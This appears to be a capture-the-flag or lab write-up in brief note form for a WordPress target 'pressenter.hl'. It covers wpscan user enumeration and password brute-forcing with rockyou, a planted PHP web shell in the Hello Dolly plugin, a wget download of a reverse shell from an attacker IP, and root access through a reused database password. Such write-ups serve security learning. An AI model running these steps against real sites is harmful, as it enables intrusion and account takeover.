# Ports Open
80
# Vulnerabilties
* weak passwords
* unencrypted passwords in database
* password reuse
# Initial Access
* the web app landing page makes reference to a domain `pressenter.hl`, so we add that entry to hour `/etc/hosts` file
* turns out this is a wordpress app, so we hit it with wpscan
```
wpscan --url http://pressenter.hl/ --enumerate vp,u,vt --verbose
```
* We identify a couple of users, so we can try brute forcing their passwords
```
wpscan --url http://pressenter.hl/ --enumerate vp,u,vt --verbose --passwords /usr/share/wordlists/rockyou.txt
```
* We have credentials now, so we can login to the wordpress app at `/wp-login.php`
* We can change the language in the settings page `http://pressenter.hl/wp-admin/options-general.php`
* There's some setting preventing us from modifying theme page code, so we'll need to modify plugin code. First we activate the hello dolly plugin from the following page:
```
http://pressenter.hl/wp-admin/plugins.php
```
* Then we edit the file at the following link:
```
http://pressenter.hl/wp-admin/plugin-editor.php
```
* We can leave this code snippet in the hello.php file:
```
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
```
* Then access the file at this endpoint `http://pressenter.hl/wp-content/plugins/hello.php`
* We can upload a reverse shell with wget
* `cmd=wget http://172.17.0.1/php-reverse-shell.php`
* Then access the following endpoint `http://pressenter.hl/wp-content/plugins/php-reverse-shell.php`
# Privilege Escalation
* there are database credentials in the `wp-config.php` file
```
mysql wordpress -u admin -p # password is rooteable
show tables;
select * from wp_usernames;
```
* this reveals credentials for the `enter` user
* but the `root` account actually uses the same password...
# Takeaways
* always check for password reuse
* keep a list of usernames and passwords, and try every combination

